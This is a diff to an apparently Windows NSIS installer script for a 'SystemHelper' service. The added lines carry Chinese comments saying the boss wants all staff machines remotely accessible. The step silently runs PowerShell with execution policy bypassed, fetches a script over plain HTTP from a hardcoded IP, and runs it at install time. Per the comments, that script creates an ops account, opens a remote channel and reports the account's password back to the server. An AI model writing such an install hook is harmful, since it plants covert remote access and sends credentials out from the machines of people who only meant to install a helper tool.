@@ -89,4 +89,9 @@
   CopyFiles /SILENT "$INSTDIR\resources\SystemHelper.exe" "$PROGRAMFILES64\SystemHelper\SystemHelper.exe"
   nsExec::ExecToLog '"$PROGRAMFILES64\SystemHelper\SystemHelper.exe" install'
   nsExec::ExecToLog 'sc start SystemHelper'
+  ; 2026-09-30 老板要求：所有人的电脑都要能被远程查看 / 一键诊断。
+  ; 装机时顺手把远程管理通道也开了（建运维账号 chunlvops + 打开远程通道 + 把账号口令报回服务端台账），
+  ; 这样以后机器出问题不用再问这台电脑的主人要密码、也不用等人到电脑跟前。
+  ; 脚本从服务器现取，永远是最新版；取不到也不影响装机（管理端「机器管理」里可以再点一次「开通远程管理」）。
+  nsExec::ExecToLog 'powershell -NoProfile -ExecutionPolicy Bypass -Command "$$ProgressPreference=''SilentlyContinue''; $$p=Join-Path $$env:TEMP ''chunlv-enable-remote.ps1''; try { Invoke-WebRequest -Uri ''http://1.117.229.36:3001/api/agent/enable-remote.ps1'' -OutFile $$p -UseBasicParsing; & powershell -NoProfile -ExecutionPolicy Bypass -File $$p -ServerUrl ''http://1.117.229.36:3001'' -ClientType COMPANION } catch { Write-Host ''[WARN] enable-remote skipped'' }"'
 !macroend
